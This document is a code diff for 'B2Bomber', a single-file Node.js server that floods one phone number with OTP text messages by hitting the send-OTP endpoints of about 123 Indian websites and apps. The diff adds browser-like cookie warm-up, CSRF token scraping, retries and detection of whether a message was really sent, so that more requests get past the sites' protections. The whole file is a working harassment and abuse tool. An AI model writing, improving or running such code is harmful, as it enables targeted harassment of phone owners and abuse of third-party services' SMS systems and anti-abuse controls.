@@ -1,14 +1,8 @@
 /**
  * ============================================================
- *  B2Bomber — multi-site OTP sender  (120+ services)
- *  Node 18+ / 20  ·  ESM  ·  Render-ready  ·  single file
- * ============================================================
- *    GET  /api/health            -> { ok, services, live, benched, impit }
- *    GET  /api/diag              -> outbound connectivity + env info
- *    GET  /api/services          -> service list + health
- *    GET  /api/selftest?number=  -> har service ko 1 baar hit + fail wale bench
- *    POST /api/stats/reset       -> health / bench reset
- *    POST /api/bomb              -> NDJSON stream: start / ping / result / done / error
+ *  B2Bomber — multi-site OTP sender  (123 services)
+ *  Node 18+ / 20 · ESM · Render-ready · single file
+ *  v3: cookie warm-up + retry  |  real success detection
  * ============================================================
  */
 import express from 'express';
@@ -21,14 +15,14 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 /* ----------------------------- config ----------------------------- */
 const PORT        = Number(process.env.PORT || 3000);
 const HOST        = '0.0.0.0';
-const TIMEOUT_MS  = Number(process.env.OTP_TIMEOUT_MS || 6000);
+const TIMEOUT_MS  = Number(process.env.OTP_TIMEOUT_MS || 7000);
+const WARM_MS     = Number(process.env.OTP_WARM_MS || 5000);
 const CONCURRENCY = Number(process.env.OTP_CONCURRENCY || 15);
 const STAGGER_MS  = Number(process.env.OTP_STAGGER_MS || 40);
 const BENCH_AFTER = Number(process.env.OTP_BENCH_AFTER || 3);
-const MAX_RUN_MS  = Number(process.env.OTP_MAX_RUN_MS || 90000);
+const MAX_RUN_MS  = Number(process.env.OTP_MAX_RUN_MS || 100000);
 const HB_MS       = 8000;
 
-/* -------------------- crash-proofing ------------------------------ */
 process.on('unhandledRejection', e => console.error('[unhandledRejection]', e));
 process.on('uncaughtException',  e => console.error('[uncaughtException]', e));
 
@@ -87,40 +81,97 @@ function makeCtx(number) {
   return { full: d, ten, plus: '+' + d, rnd: () => crypto.randomBytes(4).toString('hex') };
 }
 
+const safeOrigin = (url) => { try { return new URL(url).origin; } catch { return ''; } };
+
+/* ------------------------------------------------------------------ *
+ * COOKIE WARM-UP  — browser jaisa: pehle page GET, cookies le lo
+ * ------------------------------------------------------------------ */
+const warmCache = new Map(); // origin -> { p: Promise<{cookie,csrf}>, at }
+
+function extractCsrf(html) {
+  if (!html) return '';
+  const m =
+    html.match(/name=["']csrf-token["'][^>]*content=["']([^"']+)["']/i) ||
+    html.match(/content=["']([^"']+)["'][^>]*name=["']csrf-token["']/i) ||
+    html.match(/"csrfToken"\s*:\s*"([^"]+)"/i) ||
+    html.match(/"csrf_token"\s*:\s*"([^"]+)"/i);
+  return m ? m[1] : '';
+}
+
+function warmOnce(origin) {
+  if (!origin) return Promise.resolve({ cookie: '', csrf: '' });
+  const hit = warmCache.get(origin);
+  if (hit && Date.now() - hit.at < 8 * 60_000) return hit.p;
+
+  const p = (async () => {
+    try {
+      const res = await fetch(origin + '/', {
+        headers: {
+          'user-agent': UA,
+          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+          'accept-language': 'en-IN,en-GB;q=0.9,en;q=0.8',
+        },
+        redirect: 'follow',
+        signal: AbortSignal.timeout(WARM_MS),
+      });
+      let html = '';
+      try { html = await res.text(); } catch {}
+      const list = typeof res.headers.getSetCookie === 'function' ? res.headers.getSetCookie() : [];
+      const parts = [];
+      for (const c of list) {
+        const first = String(c).split(';')[0].trim();
+        if (first.includes('=')) parts.push(first);
+      }
+      return { cookie: parts.join('; '), csrf: extractCsrf(html) };
+    } catch { return { cookie: '', csrf: '' }; }
+  })();
+
+  warmCache.set(origin, { p, at: Date.now() });
+  return p;
+}
+
+/* ------------------------------------------------------------------ *
+ * success detection
+ * ------------------------------------------------------------------ */
+const SPA = /<div id="(root|app|__next)"|__NEXT_DATA__|data-reactroot|<app-root|window\.__NUXT__|__remixContext/i;
+const BAD = /(invalid token|unauthor|not allowed|access denied|attempt exceeded|"status":0|"success":false)/i;
+
+function isSoft(body, ct) {
+  const html = /^\s*<(!doctype|html)/i.test(body) || /text\/html/i.test(ct);
+  if (!html) return false;
+  if (SPA.test(body)) return true;
+  return !/(otp|sent|success|link|mobile|phone|verif)/i.test(body);
+}
+
+const score = r => (r.ok ? 2 : 0) + (r.soft ? -1 : 0);
+
 /* ------------------------------------------------------------------ *
  * service builders
- *   jpost(id, name, url, c => ({...}), extraHeaders?)   -> POST JSON
- *   fpost(id, name, url, c => "a=1&b=2", extraHeaders?) -> POST form
- *   get  (id, name, c => url, extraHeaders?)            -> GET
  * ------------------------------------------------------------------ */
 function autoOrigin(url) {
   try { const u = new URL(url); return { origin: u.origin, referer: u.origin + '/' }; }
   catch { return {}; }
 }
-
 const jpost = (id, name, url, bodyFn, headers = {}) => ({
   id, name, method: 'POST', url,
   headers: { ...JSONH, ...autoOrigin(url), ...headers },
   body: c => JSON.stringify(bodyFn(c)),
 });
-
 const fpost = (id, name, url, bodyFn, headers = {}) => ({
   id, name, method: 'POST', url,
   headers: { ...FORMH, ...autoOrigin(url), ...headers },
   body: bodyFn,
 });
-
 const get = (id, name, urlFn, headers = {}) => ({
-  id, name, method: 'GET', url: urlFn,
-  headers: { ...JSONH, ...headers },
+  id, name, method: 'GET', url: urlFn, headers: { ...JSONH, ...headers },
 });
 
 /* ================================================================== *
- *  SERVICES  — 120+
+ *  SERVICES
  * ================================================================== */
 const SERVICES = [
 
-  /* ============ A. AAPKE BROWSER SE CONFIRM (exact path + headers) ============ */
+  /* ===== A. aapke browser capture se (exact path + headers + cookies) ===== */
   jpost('redbus', 'RedBus', 'https://www.redbus.in/rpw/api/sendOtpV2',
     c => ({ phoneCode: '91', mobile: c.ten, reCaptchaResponse: '', whatsappOptin: true })),
 
@@ -134,9 +185,10 @@ const SERVICES = [
     }),
 
   fpost('nykaa', 'Nykaa', 'https://www.nykaa.com/app-api/index.php/customer/send_otp',
-    c => `platform=web&mobile_number=${c.ten}`, { 'x-csrf-token': 'plItKXf7zbGkMlOj' }),
+    c => `platform=web&mobile_number=${c.ten}`,
+    { 'x-csrf-token': c => c.csrf || 'plItKXf7zbGkMlOj' }),
 
-  /* ============ B. pehle se WORKING (200 OK) ============ */
+  /* ===== B. pehle se real response de rahi hain ===== */
   get('cashify', 'Cashify', c => `https://www.cashify.in/api/cu01/v1/app-link?mobile=${c.ten}`),
   jpost('treebo', 'Treebo', 'https://www.treebo.com/api/v2/auth/login/otp/', c => ({ mobile: c.ten })),
   jpost('unacademy', 'Unacademy', 'https://unacademy.com/api/v1/user/get_app_link/', c => ({ phone: c.ten })),
@@ -145,9 +197,9 @@ const SERVICES = [
   fpost('allensolly', 'Allen Solly', 'https://www.allensolly.com/capillarylogin/validateMobileOrEMail', c => `mobile=${c.ten}`),
   get('magicbricks', 'MagicBricks', c => `https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=${c.ten}`),
 
-  /* ============ C. shopping / e-commerce ============ */
-  jpost('flipkart', 'Flipkart', 'https://www.flipkart.com/api/6/user/signup/send_otp',
-    c => ({ loginId: c.ten, otp: '', loginType: 'MOBILE' }), {
+  /* ===== C. shopping ===== */
+  jpost('flipkart', 'Flipkart', 'https://www.flipkart.com/api/5/user/otp/generate',
+    c => ({ loginId: c.full, otp: '', loginType: 'MOBILE' }), {
       'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop',
     }),
   jpost('myntra', 'Myntra', 'https://www.myntra.com/gateway/v2/user/otp/send',
@@ -164,7 +216,7 @@ const SERVICES = [
   jpost('purplle', 'Purplle', 'https://www.purplle.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('mamaearth', 'Mamaearth', 'https://www.mamaearth.in/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('boat', 'boAt', 'https://www.boat-lifestyle.com/api/v1/otp/send', c => ({ mobile: c.ten })),
-  jpost('zepto', 'Zepto', 'https://www.zeptonow.com/api/v1/otp/send', c => ({ mobile: c.ten })),
+  jpost('zepto', 'Zepto', 'https://api.zeptonow.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('tatanue', 'Tata Neu', 'https://www.tataneu.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('reliancedigital', 'Reliance Digital', 'https://www.reliancedigital.in/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('vijaysales', 'Vijay Sales', 'https://www.vijaysales.com/api/v1/otp/send', c => ({ mobile: c.ten })),
@@ -173,9 +225,9 @@ const SERVICES = [
   fpost('bewakoof', 'Bewakoof', 'https://www.bewakoof.com/api/v1/user/otp', c => `mobile=${c.ten}`),
   jpost('lenskart', 'Lenskart', 'https://www.lenskart.com/api/v1/otp/send', c => ({ mobile: c.ten })),
 
-  /* ============ D. food & restaurants ============ */
+  /* ===== D. food ===== */
   jpost('zomato', 'Zomato', 'https://www.zomato.com/webroutes/auth/sendOtp', c => ({ phone: c.plus, country_code: '91' })),
-  jpost('swiggy', 'Swiggy', 'https://www.swiggy.com/api/sms/otp', c => ({ mobile: c.plus, deviceId: c.rnd() })),
+  jpost('swiggy', 'Swiggy', 'https://www.swiggy.com/dapi/auth/sms/otp', c => ({ mobile: c.plus, deviceId: c.rnd() })),
   jpost('dominos', 'Dominos', 'https://www.dominos.co.in/api/customer/send-otp', c => ({ mobile: c.ten })),
   jpost('pizzahut', 'Pizza Hut', 'https://www.pizzahut.co.in/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('burgerking', 'Burger King', 'https://www.burgerking.in/api/v1/otp/send', c => ({ mobile: c.ten })),
@@ -187,7 +239,7 @@ const SERVICES = [
   jpost('licious', 'Licious', 'https://www.licious.in/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('freshtohome', 'FreshToHome', 'https://www.freshtohome.com/api/v1/otp/send', c => ({ mobile: c.ten })),
 
-  /* ============ E. travel ============ */
+  /* ===== E. travel ===== */
   jpost('makemytrip', 'MakeMyTrip', 'https://www.makemytrip.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('goibibo', 'Goibibo', 'https://www.goibibo.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('yatra', 'Yatra', 'https://www.yatra.com/api/v1/otp/send', c => ({ mobile: c.ten })),
@@ -200,7 +252,7 @@ const SERVICES = [
   jpost('railyatri', 'RailYatri', 'https://www.railyatri.in/api/v1/otp/send', c => ({ mobile: c.ten })),
   get('happyeasygo', 'HappyEasyGo', c => `https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phoneNumber=${c.full}&countryCode=91`),
 
-  /* ============ F. rides & local ============ */
+  /* ===== F. rides & local ===== */
   fpost('porter', 'Porter', 'https://porter.in/restservice/send_app_link_sms', c => `phone_number=${c.ten}`),
   fpost('cityflo', 'Cityflo', 'https://cityflo.com/website-app-download-link-sms/', c => `phone=${c.ten}`),
   fpost('mylescars', 'Myles', 'https://www.mylescars.com/usermanagements/chkContact', c => `contact=${c.ten}`),
@@ -212,7 +264,7 @@ const SERVICES = [
   jpost('bounce', 'Bounce', 'https://www.bounceshare.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('yulu', 'Yulu', 'https://www.yulu.bike/api/v1/otp/send', c => ({ mobile: c.ten })),
 
-  /* ============ G. real estate & auto ============ */
+  /* ===== G. real estate & auto ===== */
   jpost('nobroker', 'NoBroker', 'https://www.nobroker.in/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('p99acres', '99acres', 'https://www.99acres.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('sulekha', 'Sulekha', 'https://www.sulekha.com/api/v1/otp/send', c => ({ mobile: c.ten })),
@@ -227,7 +279,7 @@ const SERVICES = [
   jpost('carwale', 'CarWale', 'https://www.carwale.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('droom', 'Droom', 'https://www.droom.in/api/v1/otp/send', c => ({ mobile: c.ten })),
 
-  /* ============ H. health ============ */
+  /* ===== H. health ===== */
   jpost('practo', 'Practo', 'https://www.practo.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('cultfit', 'cult.fit', 'https://www.cult.fit/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('medplus', 'MedPlus', 'https://www.medplusmart.com/api/v1/otp/send', c => ({ mobile: c.ten })),
@@ -238,7 +290,7 @@ const SERVICES = [
   jpost('healthifyme', 'HealthifyMe', 'https://www.healthifyme.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('beato', 'BeatO', 'https://www.beatoapp.com/api/v1/otp/send', c => ({ mobile: c.ten })),
 
-  /* ============ I. fintech ============ */
+  /* ===== I. fintech ===== */
   jpost('groww', 'Groww', 'https://api.groww.in/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('cred', 'CRED', 'https://api.cred.com/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('khatabook', 'Khatabook', 'https://api.khatabook.com/v1/otp/send', c => ({ mobile: c.ten })),
@@ -257,7 +309,7 @@ const SERVICES = [
   get('airtel', 'Airtel', c => `https://www.airtel.in/referral-api/core/notify?msisdn=${c.full}`),
   fpost('indialends', 'IndiaLends', 'https://indialends.com/internal/a/mobile-verification_v2.ashx', c => `mobile=${c.ten}`),
 
-  /* ============ J. education & jobs ============ */
+  /* ===== J. education & jobs ===== */
   jpost('pw', 'PhysicsWallah', 'https://www.pw.live/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('vedantu', 'Vedantu', 'https://www.vedantu.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('byjus', 'Byjus', 'https://www.byjus.com/api/v1/otp/send', c => ({ mobile: c.ten })),
@@ -269,7 +321,7 @@ const SERVICES = [
   jpost('toppr', 'Toppr', 'https://www.toppr.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('upgrad', 'upGrad', 'https://www.upgrad.com/api/v1/otp/send', c => ({ mobile: c.ten })),
 
-  /* ============ K. entertainment ============ */
+  /* ===== K. entertainment ===== */
   jpost('gaana', 'Gaana', 'https://api.gaana.com/otp/send', c => ({ mobile: c.ten })),
   jpost('jiosaavn', 'JioSaavn', 'https://www.jiosaavn.com/api/v1/otp/send', c => ({ mobile: c.ten })),
   jpost('hotstar', 'Hotstar', 'https://api.hotstar.com/api/v1/otp/send', c => ({ mobile: c.ten })),
@@ -279,7 +331,7 @@ const SERVICES = [
   jpost('dream11', 'Dream11', 'https://api.dream11.com/sendsmslink', c => ({ phoneNumber: c.full })),
   jpost('mpl', 'MPL', 'https://www.mpl.live/api/v1/otp/send', c => ({ mobile: c.ten })),
 
-  /* ============ L. misc ============ */
+  /* ===== L. misc ===== */
   jpost('tinder', 'Tinder', 'https://api.gotinder.com/v2/auth/sms/send', c => ({ phone_number: c.plus })),
   fpost('kfc', 'KFC', 'https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin', c => `PhoneNumber=${c.ten}`),
   jpost('grofers', 'Blinkit (old)', 'https://grofers.com/v2/accounts/', c => ({ phone: c.ten }), { auth_key: '' }),
@@ -292,8 +344,7 @@ const health = new Map();
 
 function note(svc, ok, status, ms, force = false) {
   const h = health.get(svc.id) || { ok: 0, fail: 0, streak: 0, benched: false, status: 0, ms: 0 };
-  h.status = status || 0;
-  h.ms = ms || 0;
+  h.status = status || 0; h.ms = ms || 0;
   if (ok) { h.ok++; h.streak = 0; h.benched = false; }
   else { h.fail++; h.streak++; if (force || h.streak >= BENCH_AFTER) h.benched = true; }
   health.set(svc.id, h);
@@ -307,7 +358,45 @@ function healthSnapshot() {
 }
 
 /* ------------------------------------------------------------------ *
- * ek service hit — kabhi throw nahi karta
+ * single attempt (ek request)
+ * ------------------------------------------------------------------ */
+async function attempt(svc, url, init) {
+  const t0 = Date.now();
+  try {
+    const doCall = async () => {
+      const client = svc.impit === false ? null : getImpit();
+      if (client) { try { return await client.fetch(url, init); } catch {} }
+      return await fetch(url, init);
+    };
+    const res = await hardTimeout(doCall(), TIMEOUT_MS + 1200);
+    const text = await hardTimeout(Promise.resolve(res.text()).catch(() => ''), 4000).catch(() => '');
+    const body = String(text).replace(/\s+/g, ' ').trim();
+    const status = res.status;
+    const ct = res.headers?.get?.('content-type') || '';
+    const soft = isSoft(body, ct);
+
+    let ok = status >= 200 && status < 400 && !soft;
+    let error = '';
+    if (!ok) {
+      if (soft) error = 'soft-404 (HTML page, kuch nahi bheja)';
+      else if (status >= 400) error = 'HTTP ' + status;
+      else error = 'empty response';
+    }
+    if (ok) {
+      const bad = body.match(BAD);
+      if (bad) { ok = false; error = 'body says: ' + bad[0]; }
+    }
+    return { ok, soft, status, ms: Date.now() - t0, url, snippet: body.slice(0, 120), error };
+  } catch (e) {
+    return {
+      ok: false, soft: false, status: 0, ms: Date.now() - t0, url, snippet: '',
+      error: e?.name === 'TimeoutError' ? 'timeout' : (e?.message || 'network error'),
+    };
+  }
+}
+
+/* ------------------------------------------------------------------ *
+ * sendOne — pehle seedha, fail ho to cookies le ke retry
  * ------------------------------------------------------------------ */
 async function sendOne(svc, ctx) {
   const t0 = Date.now();
@@ -316,36 +405,33 @@ async function sendOne(svc, ctx) {
     url = typeof svc.url === 'function' ? svc.url(ctx) : svc.url;
     const method = svc.method || 'GET';
 
-    const init = {
-      method,
-      headers: { ...(svc.headers || {}) },
-      redirect: 'follow',
-      signal: AbortSignal.timeout(TIMEOUT_MS),
-    };
-    if (method !== 'GET' && typeof svc.body === 'function') init.body = svc.body(ctx);
-
-    const doCall = async () => {
-      const client = svc.impit === false ? null : getImpit();
-      if (client) {
-        try { return await client.fetch(url, init); } catch { /* fetch fallback */ }
+    const mkInit = (w) => {
+      const c2 = { ...ctx, cookie: w?.cookie || '', csrf: w?.csrf || '' };
+      const headers = {};
+      for (const [k, v] of Object.entries(svc.headers || {})) {
+        headers[k] = typeof v === 'function' ? v(c2) : v;
       }
-      return await fetch(url, init);
+      if (c2.cookie) headers.cookie = c2.cookie;
+      const init = { method, headers, redirect: 'follow', signal: AbortSignal.timeout(TIMEOUT_MS) };
+      if (method !== 'GET' && typeof svc.body === 'function') init.body = svc.body(ctx);
+      return init;
     };
 
-    const res = await hardTimeout(doCall(), TIMEOUT_MS + 1200);
-    const text = await hardTimeout(Promise.resolve(res.text()).catch(() => ''), 4000).catch(() => '');
-    const ms = Date.now() - t0;
-    const ok = res.status >= 200 && res.status < 400;
+    const warmP = svc.warm === false ? null : warmOnce(safeOrigin(url));
 
-    return {
-      ok, status: res.status, ms, url,
-      snippet: String(text).replace(/\s+/g, ' ').trim().slice(0, 120),
-      error: ok ? '' : 'HTTP ' + res.status,
-    };
+    let r = await attempt(svc, url, mkInit(null));
+
+    if (!r.ok || r.soft) {
+      const w = warmP ? await warmP.catch(() => null) : null;
+      if (w && (w.cookie || w.csrf)) {
+        const r2 = await attempt(svc, url, mkInit(w));
+        if (score(r2) > score(r)) r = r2;
+      }
+    }
+    r.ms = Date.now() - t0;
+    return r;
   } catch (e) {
-    const ms = Date.now() - t0;
-    const msg = e?.name === 'TimeoutError' ? 'timeout' : (e?.message || 'network error');
-    return { ok: false, status: 0, ms, url, snippet: '', error: msg };
+    return { ok: false, soft: false, status: 0, ms: Date.now() - t0, url, snippet: '', error: e?.message || 'network error' };
   }
 }
 
@@ -365,23 +451,20 @@ app.use((req, res, next) => {
   if (req.method === 'OPTIONS') return res.sendStatus(204);
   next();
 });
-
 app.use((req, _res, next) => { console.log(`${req.method} ${req.url}`); next(); });
 
 app.get('/api/health', (_req, res) => {
   const benched = [...health.values()].filter(h => h.benched).length;
   res.json({
-    ok: true,
-    services: SERVICES.length,
-    live: SERVICES.length - benched,
-    benched,
-    impit: !!getImpit(),
-    node: process.version,
-    uptime: Math.round(process.uptime()),
+    ok: true, services: SERVICES.length, live: SERVICES.length - benched, benched,
+    impit: !!getImpit(), warmed: warmCache.size, node: process.version, uptime: Math.round(process.uptime()),
   });
 });
 
-app.post('/api/stats/reset', (_req, res) => { health.clear(); res.json({ ok: true, reset: true }); });
+app.post('/api/stats/reset', (_req, res) => {
+  health.clear(); warmCache.clear();
+  res.json({ ok: true, reset: true });
+});
 
 app.get('/api/services', (_req, res) => res.json({ ok: true, count: SERVICES.length, services: healthSnapshot() }));
 
@@ -400,18 +483,17 @@ app.get('/api/diag', async (_req, res) => {
   res.json({
     ok: true, node: process.version, platform: process.platform,
     region: process.env.RENDER_REGION || process.env.REGION || 'n/a',
-    impit: !!getImpit(), services: SERVICES.length,
+    impit: !!getImpit(), services: SERVICES.length, warmed: warmCache.size,
     benched: [...health.entries()].filter(([, h]) => h.benched).map(([id]) => id),
     outbound,
   });
 });
 
-/* self-test -> fail wale turant bench */
+/* self-test -> fail turant bench */
 app.get('/api/selftest', async (req, res) => {
   const raw = String(req.query.number || '9999999999');
   const ctx = makeCtx(raw.length === 10 ? raw : raw.slice(-10));
   const list = SERVICES.slice();
-
   const results = [];
   let idx = 0;
 
@@ -425,20 +507,18 @@ app.get('/api/selftest', async (req, res) => {
       results.push({ id: svc.id, name: svc.name, ok: r.ok, status: r.status, ms: r.ms, error: r.error, snippet: r.snippet, url: r.url });
     }
   });
-
   await Promise.all(workers);
 
   const ok = results.filter(r => r.ok).length;
   res.json({ ok, total: results.length, benched: results.length - ok, number: ctx.full, results });
 });
 
-/* ------------------- bomber : NDJSON stream ----------------------- */
+/* bomber */
 app.post('/api/bomb', async (req, res) => {
   try {
     const number = String(req.body?.number || '').replace(/\D/g, '');
     const repeat = Math.min(10, Math.max(1, Number(req.body?.repeat) || 1));
     const skipDead = req.body?.skipDead !== false;
-
     if (number.length < 10 || number.length > 15) return res.status(400).json({ error: 'invalid number' });
 
     const ctx = makeCtx(number);
@@ -454,22 +534,13 @@ app.post('/api/bomb', async (req, res) => {
     res.flushHeaders?.();
     res.setTimeout?.(0);
 
-    // 'close' res par suno (req par nahi)
     let closed = false;
     res.on('close', () => { if (!res.writableEnded) closed = true; });
     res.on('error', () => { closed = true; });
 
-    const emit = (o) => {
-      if (res.writableEnded) return;
-      try { res.write(JSON.stringify(o) + '\n'); } catch {}
-    };
-
+    const emit = (o) => { if (res.writableEnded) return; try { res.write(JSON.stringify(o) + '\n'); } catch {} };
     const hb = setInterval(() => emit({ type: 'ping', t: Date.now() }), HB_MS);
-    const finishAll = (o) => {
-      clearInterval(hb);
-      emit(o);
-      if (!res.writableEnded) { try { res.end(); } catch {} }
-    };
+    const finishAll = (o) => { clearInterval(hb); emit(o); if (!res.writableEnded) { try { res.end(); } catch {} } };
 
     emit({ type: 'start', total, services: active.length, repeat, skipped, number: ctx.full });
     if (!total) return finishAll({ type: 'done', sent: 0, failed: 0, total: 0, done: 0 });
@@ -496,12 +567,9 @@ app.post('/api/bomb', async (req, res) => {
         done++; r.ok ? sent++ : failed++;
 
         emit({
-          type: 'result', done, sent, failed,
-          id: svc.id, name: svc.name,
-          status: r.status, ms: r.ms, ok: r.ok,
-          error: r.error, snippet: r.snippet, url: r.url,
+          type: 'result', done, sent, failed, id: svc.id, name: svc.name,
+          status: r.status, ms: r.ms, ok: r.ok, error: r.error, snippet: r.snippet, url: r.url,
         });
-
         if (STAGGER_MS) await sleep(STAGGER_MS);
       }
     };
@@ -518,11 +586,9 @@ app.post('/api/bomb', async (req, res) => {
 });
 
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
-
 app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));
 app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 app.get('/favicon.ico', (_req, res) => res.status(204).end());
-
 app.use((err, _req, res, _next) => {
   console.error('[error]', err);
   if (!res.headersSent) res.status(500).json({ error: err?.message || 'server error' });
